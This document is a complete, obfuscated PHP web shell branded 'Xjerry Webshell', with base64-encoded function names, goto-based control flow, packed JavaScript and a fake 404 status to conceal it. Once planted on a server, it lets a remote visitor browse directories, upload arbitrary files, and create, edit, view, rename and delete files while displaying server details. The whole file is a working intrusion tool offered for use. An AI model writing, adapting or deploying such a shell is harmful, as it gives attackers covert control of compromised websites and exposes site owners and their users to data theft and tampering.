
<?php error_reporting(0);
ini_set(base64_decode('aW11bmlmeTM2MC5jbGVhbnVwX29uX3Jlc3RvcmU='), false);
http_response_code(404);
$G3 = base64_decode('c2NhbmRpcg==');
$c8 = [
    base64_decode('NzA2ODcwNWY3NTZlNjE2ZDY1'),
    base64_decode('NzA2ODcwNzY2NTcyNzM2OTZmNmU='),
    base64_decode('Njc2NTc0NjM3NzY0'),
    base64_decode('NjM2ODY0Njk3Mg=='),
    base64_decode('NzA3MjY1Njc1ZjczNzA2YzY5NzQ='),
    base64_decode('NjE3MjcyNjE3OTVmNjQ2OTY2NjY='),
    base64_decode('Njk3MzVmNjQ2OTcy'),
    base64_decode('Njk3MzVmNjY2OTZjNjU='),
    base64_decode('Njk3MzVmNzc3MjY5NzQ2MTYyNmM2NQ=='),
    base64_decode('Njk3MzVmNzI2NTYxNjQ2MTYyNmM2NQ=='),
    base64_decode('NjY2OTZjNjU3MzY5N2E2NQ=='),
    base64_decode('NjM2ZjcwNzk='),
    base64_decode('NjY2OTZjNjU1ZjY1Nzg2OTczNzQ3Mw=='),
    base64_decode('NjY2OTZjNjU1ZjcwNzU3NDVmNjM2ZjZlNzQ2NTZlNzQ3Mw=='),
    base64_decode('NjY2OTZjNjU1ZjY3NjU3NDVmNjM2ZjZlNzQ2NTZlNzQ3Mw=='),
    base64_decode('NmQ2YjY0Njk3Mg=='),
    base64_decode('NzI2NTZlNjE2ZDY1'),
    base64_decode('NzM3NDcyNzQ2Zjc0Njk2ZDY1'),
    base64_decode('Njg3NDZkNmM3MzcwNjU2MzY5NjE2YzYzNjg2MTcyNzM='),
    base64_decode('NjQ2MTc0NjU='),
    base64_decode('NjY2OTZjNjU2ZDc0Njk2ZDY1'),
];
$lE = 0;
T4:
if (!($lE < count($c8))) {
    goto Je;
}
$c8[$lE] = JD($c8[$lE]);
Cy:
$lE++;
goto T4;
Je:
if (isset($_GET[base64_decode('cA==')])) {
    goto sr;
}
$Jd = $c8[2]();
goto VN;
sr:
$Jd = jD($_GET[base64_decode('cA==')]);
$c8[3](Jd($_GET[base64_decode('cA==')]));
VN:
function Ss($SP)
{
    $dE = '';
    $lE = 0;
    NZ:
    if (!($lE < strlen($SP))) {
        goto Xc;
    }
    $dE .= dechex(ord($SP[$lE]));
    WK:
    $lE++;
    goto NZ;
    Xc:
    return $dE;
}
function Jd($SP)
{
    $dE = '';
    $gf = strlen($SP) - 1;
    $lE = 0;
    Xp:
    if (!($lE < $gf)) {
        goto ur;
    }
    $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1]));
    Wn:
    $lE += 2;
    goto Xp;
    ur:
    return $dE;
}
function rn($F1)
{
    $Jd = fileperms($F1);
    if (($Jd & 0xc000) == 0xc000) {
        goto FZ;
    }
    if (($Jd & 0xa000) == 0xa000) {
        goto Eu;
    }
    if (($Jd & 0x8000) == 0x8000) {
        goto ES;
    }
    if (($Jd & 0x6000) == 0x6000) {
        goto sA;
    }
    if (($Jd & 0x4000) == 0x4000) {
        goto lG;
    }
    if (($Jd & 0x2000) == 0x2000) {
        goto tV;
    }
    if (($Jd & 0x1000) == 0x1000) {
        goto Tx;
    }
    $lE = base64_decode('dQ==');
    goto cC;
    FZ:
    $lE = base64_decode('cw==');
    goto cC;
    Eu:
    $lE = base64_decode('bA==');
    goto cC;
    ES:
    $lE = base64_decode('LQ==');
    goto cC;
    sA:
    $lE = base64_decode('Yg==');
    goto cC;
    lG:
    $lE = base64_decode('ZA==');
    goto cC;
    tV:
    $lE = base64_decode('Yw==');
    goto cC;
    Tx:
    $lE = base64_decode('cA==');
    cC:
    $lE .= $Jd & 0x100 ? base64_decode('cg==') : base64_decode('LQ==');
    $lE .= $Jd & 0x80 ? base64_decode('dw==') : base64_decode('LQ==');
    $lE .= $Jd & 0x40 ? ($Jd & 0x800 ? base64_decode('cw==') : base64_decode('eA==')) : ($Jd & 0x800 ? base64_decode('Uw==') : base64_decode('LQ=='));
    $lE .= $Jd & 0x20 ? base64_decode('cg==') : base64_decode('LQ==');
    $lE .= $Jd & 0x10 ? base64_decode('dw==') : base64_decode('LQ==');
    $lE .= $Jd & 0x8 ? ($Jd & 0x400 ? base64_decode('cw==') : base64_decode('eA==')) : ($Jd & 0x400 ? base64_decode('Uw==') : base64_decode('LQ=='));
    $lE .= $Jd & 0x4 ? base64_decode('cg==') : base64_decode('LQ==');
    $lE .= $Jd & 0x2 ? base64_decode('dw==') : base64_decode('LQ==');
    $lE .= $Jd & 0x1 ? ($Jd & 0x200 ? base64_decode('dA==') : base64_decode('eA==')) : ($Jd & 0x200 ? base64_decode('VA==') : base64_decode('LQ=='));
    return $lE;
}
function Xe($OB, $Ch = 1, $BL = '')
{
    global $Jd;
    $xe = $Ch == 1 ? base64_decode('c3VjY2Vzcw==') : base64_decode('ZXJyb3I=');
    echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" .
        Ss($Jd) .
        $BL .
        base64_decode('In19KTwvc2NyaXB0Pg==');
}
function tF($yf)
{
    global $c8;
    if (!(trim(pathinfo($yf, PATHINFO_BASENAME), base64_decode('Lg==')) === '')) {
        goto IE;
    }
    return;
    IE:
    if ($c8[6]($yf)) {
        goto PF;
    }
    unlink($yf);
    goto jK;
    PF:
    array_map(
        base64_decode('ZGVsZGly'),
        glob($yf . DIRECTORY_SEPARATOR . base64_decode('eywufSo='), GLOB_BRACE | GLOB_NOSORT)
    );
    rmdir($yf);
    jK:
}
?> 
<!DOCTYPE html>
<html lang="en">
<head>
<meta property="og:image" content="https://pub-36d33425498c4ee6b5bf58d8dc166c1c.r2.dev/panda-removebg-preview.png" />
<meta property="og:title" content="Xjerry Webshell" />
<meta property="og:description" content="" />
<meta name="theme-color" content="Magenta">
<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
<title>Xjerry Webshell</title>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="https://pub-36d33425498c4ee6b5bf58d8dc166c1c.r2.dev/panda-removebg-preview.png">
<style type="text/css">
@import url('https://fonts.googleapis.com/css2?family=Merienda:ital,wght@0,400;0,700;1,400;1,700&display=swap');
@import url('//fonts.googleapis.com/css2?family=Protest+Revolution&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Merienda:wght@300..900&display=swap');

body {
    color: black;
    font-size: 0px;
    font-family: 'Merienda';
    width: 99%;
    padding: 0px;
    margin-right: auto;
    margin-left: auto;
    margin-top: 10px;
    margin-bottom: 7px;
    background-image: url(https://pub-36d33425498c4ee6b5bf58d8dc166c1c.r2.dev/fafa.jpg);
    background-attachment: fixed;
    background-size: 85rem;
    background-position: center;
    background-repeat: no-repeat;
    background-color: black!important;
}

.bg-dark {
    background-color: black!important;
}

.border {
    box-shadow: 0px 0px 10px Magenta;
    border: 2px solid Magenta!important;
    border-radius: 5px;
    background: transparent;
}

.border:hover {
    box-shadow: 0px 0px 10px Magenta;
    border: 2px solid Magenta!important;
}

.table td {
    padding: 0.1rem;
    box-shadow: inset 0px 0px 0px 1px Magenta;
    border-radius: 2px;
}

.table thead th {
    font-family: 'Kaushan Script', cursive;
    box-shadow: inset 0px 0px 0px 1.5px Magenta;
    color: Aqua;
    padding: 0.25rem;
    border-radius: 5px;
    background: linear-gradient(to bottom, black, #3f3f3f80);
}

.table-hover tbody tr:hover td {
    background: #3f3f3f80;
    box-shadow: inset 0px 0px 0px 1px Magenta;
    border-radius: 2px;
}

.table-hover tbody tr:hover td>* {
}

.table>tbody>tr>* {
    color:#fff;
    vertical-align:middle;
}

.form-control {
    background:0 0!important;
    color:#fff!important;
    border-radius:0;
}

.form-control::placeholder {
    color:#fff;
    opacity:1;
}

.form-group {
    margin-top: 1.5px;
    margin-bottom: 1.5px;
}

li {
    font-size:17px!important;
    color: Aqua!important;
    list-style: inherit!important;
    line-height: 1.6;
}

a {
    color: #ffffff;
    text-decoration: none!important;
}

a:hover {
    text-decoration: none!important;
    color: Magenta;
    animation: kedip 1s linear infinite;
}

h5 {
    margin-top: 1.5px;
    margin-bottom: 1.5px;
    font-size: 18px!important;
    color: Aqua!important;
    padding: 2px;
    font-family: 'Kaushan Script';
}

textarea {
    width: 97%;
    font-size: 16px;
    font-family: inherit;
    height: 44vh;
    padding-left: 5px;
}

button, input {
    border: 2px solid Magenta;
    border-radius: 5px;
    color: white;
    font-size: 14px;
    line-height: normal;
    font-family: inherit;
    box-shadow: 0px 0px 5px Magenta;
    background: transparent;
}

button, input:hover {
    border: 2px solid Aqua;
    cursor: pointer;
    box-shadow: 0px 0px 5px Magenta;
}

.ohct {
    padding-left: 1rem;
    padding-right: 1rem;
    color: white;
    border: 2px solid Magenta;
    border-radius: 5px;
    background-color: transparent;
    font-family: inherit;
    font-size: 15px;
    box-shadow: 0px 0px 5px Magenta;
}

.ohct:hover {
    border: 2px solid Aqua;
    color: Aqua!important;
    box-shadow: 0px 0px 5px Magenta;
}

.alex {
    color: white;
}

.alex:hover {
    color: Magenta;
}

.p-1 {
    padding: 4px;
}

::selection {
    color: black;
    background: silver;
}

.fa {
    padding: 10px;
    font-size: 20px;
    width: 50px;
    text-align: center;
    text-decoration: none;
    margin: 5px;
    color: Aqua;
}

.fa:hover {
    border: 2px solid Magenta;
}

.text-light {
    color: #f8f9fa!important;
    font-size: 17px!important;
}

.kedip {
    animation: kedip 1s linear infinite;
}

@keyframes kedip {
    0% {
        color: Magenta;
    }
    50% {
        color: Aqua;
    }
    100% {
        color: Magenta;
    }
}
</style>
<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head>
<body>
<div class="table-responsive text-light" style="text-align: left;padding: 4px;border: 2px solid Magenta;border-radius:5px;">
    <div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
        <a href="https://t.me/xzjerry" style="font-size: 2rem;font-family: Merienda;text-shadow: 0px 0px 10px Magenta;padding-left: 0.3rem;padding-right: 0.3rem;"><span class="kedip">Xjerry Webshell</span></a>
    </div>
        <li>Your IP : <span style="color: white;"><?php echo $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; ?></span></li>
        <li>Server IP : <span style="color: white;"><?php echo $_SERVER[base64_decode('U0VSVkVSX05BTUU=')]; ?></span></li>
        <li>Server : <span style="color: white;"><?php echo php_uname(); ?></span></li>
        <li>Server Software : <span style="color: white;"><?php echo $_SERVER[base64_decode('U0VSVkVSX1NPRlRXQVJF')]; ?></span></li>
        <li>PHP Version : <span style="color: white;"><?php echo phpversion(); ?></span></li>
		<li>Made By : <a href="https://t.me/xzjerry" style="font-size: 1rem;font-family: Merienda;text-shadow: 0px 0px 10px Magenta;padding-left: 0.3rem;padding-right: 0.3rem;"><span class="kedip">Xjerry</span></a>
        <li><a href="?p=<?= ss($Jd) . base64_decode('JmE9') . Ss(base64_decode('bmV3RmlsZQ==')) ?>" class="ohct">Buat File</a> | <a href="?p=<?= Ss($Jd) . base64_decode('JmE9') . sS(base64_decode('bmV3RGly')) ?>" class="ohct">Buat Folder</a></li>
        <li>
            <form method="post" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
    <input type="file" name="files[]">
    <input type="submit" value="Upload" name="submit" class="button ohct">
</form>

<?php if (!isset($_FILES[base64_decode('ZmlsZXM=')])) {
    goto ea;
}

$uploadedFiles = $_FILES[base64_decode('ZmlsZXM=')][base64_decode('bmFtZQ==')];
$index = 0;

th:
if (!($index < count($uploadedFiles))) {
    goto ea;
}

if (move_uploaded_file($_FILES[base64_decode('ZmlsZXM=')][base64_decode('dG1wX25hbWU=')][$index], $uploadedFiles[$index])) {
    goto PG;
}

Xe(base64_decode('RmlsZSBnYWdhbCBkaXVuZ2dhaA=='), 0);
goto tG;

PG:
xe(base64_decode('RmlsZSBiZXJoYXNpbCBkaXVuZ2dhaA=='));

tG:
$index++;
goto th;

dx:
ea:

if (!isset($_GET[base64_decode('ZG93bmxvYWQ=')])) {
    goto FA;
}

header(base64_decode('Q29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0='));
header(base64_decode('Q29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogQmluYXJ5'));
header(base64_decode('Q29udGVudC1MZW5ndGg6IA==') . getFileSize($_GET[base64_decode('bmFtZQ==')]));
header(base64_decode('Q29udGVudC1kaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Ig==') . $_GET[base64_decode('bmFtZQ==')] . base64_decode('Ig=='));

FA:
?>
        </li>
</div>
<div class="table-responsive text-light" style="text-align: left;padding: 4px;margin-bottom: 3px;margin-top: 3px;border: 2px solid Magenta;border-radius:5px;">
<li>Dir : <span><?php $Op = $c8[4](base64_decode('LyhcXHxcLykv'), $Jd);
foreach ($Op as $j3 => $Oe) {
    if (!($j3 == 0 && $Oe == '')) {
        goto xi;
    }
    echo base64_decode('PGEgaHJlZj0iP3A9MmYiIGNsYXNzPSJjb21iZXQiPn48L2E+Lw==');
    goto CS;
    xi:
    if (!($Oe == '')) {
        goto sq;
    }
    goto CS;
    sq:
    echo base64_decode('PGEgY2xhc3M9ImNvbWJldCIgaHJlZj0iP3A9');
    $lE = 0;
    de:
    if (!($lE <= $j3)) {
        goto ie;
    }
    echo sS($Op[$lE]);
    if (!($lE != $j3)) {
        goto s0;
    }
    echo base64_decode('MmY=');
    s0:
    dg:
    $lE++;
    goto de;
    ie:
    echo "\">{$Oe}</a>/";
    CS:
}
Go:
?> 
</span></li></div>
<div class="table-responsive text-light" style="text-align: center;font-family: inherit;font-size: large;">
<?php if (!isset($_GET[base64_decode('YQ==')])) {
    goto Un;
}
if (!isset($_GET[base64_decode('YQ==')])) {
    goto cc;
}
$im = Jd($_GET[base64_decode('YQ==')]);
cc:
?>
<?php if ($im == base64_decode('ZGVsZXRl')) {
    $BL = $Jd . base64_decode('Lw==') . jd($_GET[base64_decode('bg==')]);
    
    if ($_GET[base64_decode('dA==')] == base64_decode('ZA==')) {
        rmdir($BL);
        
        if (!file_exists($BL)) {
            xe(base64_decode('Zm9sZGVyIGRlbGV0ZWQgc3VjY2Vzc2Z1bGx5'));
        } else {
            Xe(base64_decode('ZmFpbGVkIHRvIGRlbGV0ZSB0aGUgZm9sZGVy'), 0);
        }
    }
    
    if ($_GET[base64_decode('dA==')] == base64_decode('Zg==')) {
        unlink($BL);
        
        if (!file_exists($BL)) {
            xe(base64_decode('ZmlsZSBkZWxldGVkIHN1Y2Nlc3NmdWxseQ=='));
        } else {
            Xe(base64_decode('ZmFpbGVkIHRvIGRlbGV0ZSB0aGUgZmlsZQ=='), 0);
        }
    }
} else {
    Lu:
}
?>
<?php if ($im == base64_decode('bmV3RGly')) {
    goto Fg;
}
if ($im == base64_decode('bmV3RmlsZQ==')) {
    goto Pb;
}
if ($im == base64_decode('cmVuYW1l')) {
    goto Lw;
}
if ($im == base64_decode('ZWRpdA==')) {
    goto Ox;
}
if ($im == base64_decode('dmlldw==')) {
    goto Ag;
}
goto WC;
Fg:
?>
<h5 class="p-1" style="text-align: center;border: 2px solid Magenta;border-radius:5px;">New Folder Name :</h5>
<form method="post">
<div class="form-group">
<input name="n" id="n" class="border p-1" autocomplete="off" style="text-align: center;">
</div>
<div class="form-group" style="margin-top: 10px;">
<button type="submit" name="s" class="ohct">Create</button>
</div> 
</form> 
<?php isset($_POST[base64_decode('cw==')])
    ? (file_exists("{$Jd}/{$_POST[base64_decode('bg==')]}")
        ? xE(base64_decode('Zm9sZGVyIG5hbWUgaGFzIGJlZW4gdXNlZA=='), 0, base64_decode('JmE9') . SS(base64_decode('bmV3RGly')))
        : (mkdir("{$Jd}/{$_POST[base64_decode('bg==')]}")
            ? xe(base64_decode('Zm9sZGVyIGNyZWF0ZWQgc3VjY2Vzc2Z1bGx5'))
            : Xe(base64_decode('Zm9sZGVyIGZhaWxlZCB0byBjcmVhdGU='), 0)))
    : null;
goto WC;
Pb:
?>
<h5 class="p-1" style="text-align: center;border: 2px solid Magenta;border-radius:5px;">New File Name :</h5>
<form method="post">
<div class="form-group">
<input type="text" name="n" id="n" class="border p-1" placeholder="" style="text-align: center;">
</div>
<div class="form-group">
<textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control border" placeholder=""></textarea>
</div>
<div class="form-group" style="margin-top: 10px;">
<button type="submit" name="s" class="ohct">Create</button> 
</div>
</form>
<?php if (isset($_POST[base64_decode('cw==')])) {
    if (file_exists("{$Jd}/{$_POST[base64_decode('bg==')]}")) {
        xE(base64_decode('bmFtYSBmaWxlIHRlbGFoIGRpZ3VuYWthbg=='), 0, base64_decode('JmE9') . SS(base64_decode('bmV3RmlsZQ==')));
    } else {
        if (file_put_contents("{$Jd}/{$_POST[base64_decode('bg==')]}", $_POST[base64_decode('Y3Ru')])) {
            xe(base64_decode('ZmlsZSBiZXJoYXNpbCBkaWJ1YXQ='), 1, base64_decode('JmE9') . ss(base64_decode('dmlldw==')) . base64_decode('Jm49') . Ss($_POST[base64_decode('bg==')]));
        } else {
            Xe(base64_decode('ZmlsZSBnYWdhbCBkaWJ1YXQ='), 0);
        }
    }
} else {
    null;
}
goto WC;
Lw:
?>
<h5 class="border p-1">Rename File : <?= jD($_GET[base64_decode('bg==')]) ?></h5>
<form method="post">
<div class="form-group">
<input type="text" name="n" id="n" style="text-align: center;" class="border p-1" value="<?= jD(
    $_GET[base64_decode('bg==')]
) ?>">
</div>
<div class="form-group" style="margin-top: 10px;">
<button type="submit" name="s" class="ohct">Save</button>
</div>
</form>
<?php isset($_POST[base64_decode('cw==')])
    ? (rename($Jd . base64_decode('Lw==') . jD($_GET[base64_decode('bg==')]), $_POST[base64_decode('bg==')])
        ? xe(base64_decode('c3VjY2Vzc2Z1bGx5IGNoYW5nZWQgdGhlIGZvbGRlciBuYW1l'))
        : Xe(base64_decode('ZmFpbGVkIHRvIGNoYW5nZSB0aGUgZm9sZGVyIG5hbWU='), 0))
    : null;
goto WC;
Ox:
?>
<h5 class="p-1" style="text-align: center;border: 2px solid Magenta;border-radius:5px;">Edit File Name : <font color="white"><?= Jd(
    $_GET[base64_decode('bg==')]
) ?></font></h5>
<form method="post">
<div class="form-group">
<textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control border"><?= $c8[18](
    file_get_contents($Jd . base64_decode('Lw==') . jD($_GET[base64_decode('bg==')]))
) ?></textarea>
</div>
<div class="form-group" style="margin-top: 10px;">
<button type="submit" name="s" class="ohct">Save</button>
</div>
</form>
<?php if (isset($_POST[base64_decode('cw==')])) {
    if (file_put_contents($Jd . base64_decode('Lw==') . jD($_GET[base64_decode('bg==')]), $_POST[base64_decode('Y3Ru')])) {
        xe(
            base64_decode('a29udGVuIGZpbGUgYmVyaGFzaWwgZGl1YmFo'),
            1,
            base64_decode('JmE9') . sS(base64_decode('dmlldw==')) . "&n={$_GET[base64_decode('bg==')]}"
        );
    } else {
        xE(base64_decode('a29udGVuIGZpbGUgZ2FnYWwgZGl1YmFo'));
    }
}
goto WC;
Ag:
?>
<h5 class="p-1" style="text-align: center;border: 2px solid Magenta;border-radius:5px;">View File Name : <font color="white"><?= jd(
    $_GET[base64_decode('bg==')]
) ?></font></h5>
<div class="form-group">
<textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control border" readonly><?= $c8[18](
    $c8[14]($Jd . base64_decode('Lw==') . jd($_GET[base64_decode('bg==')]))
) ?></textarea>
</div>
<?php WC: ?>
</div>
<?php goto mR;
Un:
?>
<table class="table table-hover table-borderless table-sm" style="text-align: center;width: 100%;">
<thead class="text-light">
<tr>
<th style="width: 45%;">Name</th>
<th style="width: 13%;">Size</th>
<th style="width: 13%;">Permission</th>
<th colspan="3">Action</th>
</tr>
</thead>
<tbody class="text-light"> <?php $G3 = $c8[5]($G3($Jd), [base64_decode('Lg=='), base64_decode('Li4=')]);
foreach ($G3 as $yf) {
    if ($c8[6]("{$Jd}/{$yf}")) {
        goto CB;
    }
    goto Qj;
    CB:
    echo base64_decode('IA0KPHRyPg0KPHRkIHN0eWxlPSJ0ZXh0LWFsaWduOiBsZWZ0OyI+DQo8aSBjbGFzcz0iZmEgZmEtZncgZmEtZm9sZGVyLW8iIHN0eWxlPSJib3JkZXI6IDA7cGFkZGluZzogMDt3aWR0aDogMS4yODU3MTQyOWVtOyI+PC9pPjxhIGhyZWY9Ij9wPQ==') .
        sS("{$Jd}/{$yf}") .
        base64_decode('IiBkYXRhLXRvZ2dsZT0idG9vbHRpcCIgZGF0YS1wbGFjZW1lbnQ9ImF1dG8iIHRpdGxlPSJMYXRlc3QgbW9kaWZ5IG9uIA==') .
        $c8[19](base64_decode('WS1tLWQgSDpp'), $c8[20]("{$Jd}/{$yf}")) .
        "\">{$yf}</a></td>
<td style=\"color: black;\"><span></span></td>
<td><font color=\"" .
        ($c8[8]("{$Jd}/{$yf}")
            ? base64_decode('IzAwZmYwMA==')
            : (!$c8[9]("{$Jd}/{$yf}")
                ? base64_decode('Y3lhbg==')
                : null)) .
        base64_decode('Ij4=') .
        RN("{$Jd}/{$yf}") .
        base64_decode('PC9mb250PjwvdGQ+DQo8dGQgc3R5bGU9ImNvbG9yOiBibGFjazt3aWR0aDogOS41JTsiPjxzcGFuPjwvc3Bhbj48L3RkPg0KPHRkPg0KPGEgaHJlZj0iP3A9') .
        ss($Jd) .
        base64_decode('JmE9') .
        ss(base64_decode('cmVuYW1l')) .
        base64_decode('Jm49') .
        ss($yf) .
        base64_decode('JnQ9ZCIgZGF0YS10b2dnbGU9InRvb2x0aXAiIGRhdGEtcGxhY2VtZW50PSJhdXRvIiB0aXRsZT0iUmVuYW1lIj5SZW5hbWU8L2E+DQo8L3RkPg0KPHRkPg0KPGEgaHJlZj0iP3A9') .
        sS($Jd) .
        base64_decode('JmE9') .
        ss(base64_decode('ZGVsZXRl')) .
        base64_decode('Jm49') .
        ss($yf) .
        base64_decode('IiBjbGFzcz0iZGVsZXRlIiBkYXRhLXR5cGU9ImZvbGRlciIgZGF0YS10b2dnbGU9InRvb2x0aXAiIGRhdGEtcGxhY2VtZW50PSJhdXRvIiB0aXRsZT0iRGVsZXRlIj5EZWxldGU8L2E+DQo8L3RkPg0KPC90cj4=');
    Qj:
}
ad:
foreach ($G3 as $F1) {
    if ($c8[7]("{$Jd}/{$F1}")) {
        goto wA;
    }
    goto X1;
    wA:
    $kL = $c8[10]("{$Jd}/{$F1}") / 1024;
    $kL = round($kL, 3);
    $kL = $kL > 1024 ? round($kL / 1024, 2) . base64_decode('ICBNQg==') : $kL . base64_decode('ICBLQg==');
    echo base64_decode('DQo8dHI+DQo8dGQgc3R5bGU9InRleHQtYWxpZ246IGxlZnQ7Ij4NCjxpIGNsYXNzPSJmYSBmYS1mdyBmYS1maWxlLW8iIHN0eWxlPSJib3JkZXI6IDA7cGFkZGluZzogMDt3aWR0aDogMS4yODU3MTQyOWVtOyI+PC9pPjxhIGhyZWY9Ij9wPQ==') .
        SS($Jd) .
        base64_decode('JmE9') .
        sS(base64_decode('dmlldw==')) .
        base64_decode('Jm49') .
        SS($F1) .
        base64_decode('IiBkYXRhLXRvZ2dsZT0idG9vbHRpcCIgZGF0YS1wbGFjZW1lbnQ9ImF1dG8iIHRpdGxlPSJMYXRlc3QgbW9kaWZ5IG9uIA==') .
        $c8[19](base64_decode('WS1tLWQgSDpp'), $c8[20]("{$Jd}/{$F1}")) .
        "\">{$F1}</a></td>
<td><span>{$kL}</span></td>
<td><font color=\"" .
        ($c8[8]("{$Jd}/{$F1}")
            ? base64_decode('IzAwZmYwMA==')
            : (!$c8[9]("{$Jd}/{$F1}")
                ? base64_decode('Y3lhbg==')
                : null)) .
        base64_decode('Ij4=') .
        rN("{$Jd}/{$F1}") .
        base64_decode('PC9mb250PjwvdGQ+DQo8dGQ+PGEgaHJlZj0iP3A9') .
        Ss($Jd) .
        base64_decode('JmE9') .
        Ss(base64_decode('ZWRpdA==')) .
        base64_decode('Jm49') .
        SS($F1) .
        base64_decode('IiBkYXRhLXRvZ2dsZT0idG9vbHRpcCIgZGF0YS1wbGFjZW1lbnQ9ImF1dG8iIHRpdGxlPSJFZGl0Ij5FZGl0PC9hPjwvdGQ+DQo8dGQ+PGEgaHJlZj0iP3A9') .
        ss($Jd) .
        base64_decode('JmE9') .
        SS(base64_decode('cmVuYW1l')) .
        base64_decode('Jm49') .
        ss($F1) .
        base64_decode('JnQ9ZiIgZGF0YS10b2dnbGU9InRvb2x0aXAiIGRhdGEtcGxhY2VtZW50PSJhdXRvIiB0aXRsZT0iUmVuYW1lIj5SZW5hbWU8L2E+PC90ZD4NCjx0ZD48YSBocmVmPSI/cD0=') .
        ss($Jd) .
        base64_decode('JmE9') .
        sS(base64_decode('ZGVsZXRl')) .
        base64_decode('Jm49') .
        ss($F1) .
        base64_decode('IiBjbGFzcz0iZGVsZXRlIiBkYXRhLXR5cGU9ImZpbGUiIGRhdGEtdG9nZ2xlPSJ0b29sdGlwIiBkYXRhLXBsYWNlbWVudD0iYXV0byIgdGl0bGU9IkRlbGV0ZSI+RGVsZXRlPC9hPjwvdGQ+DQo8L3RyPg==');
    X1:
}
a2:
?> 
</tbody>
</table>
<?php mR: ?> 
</div>
<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
</body>
</html>
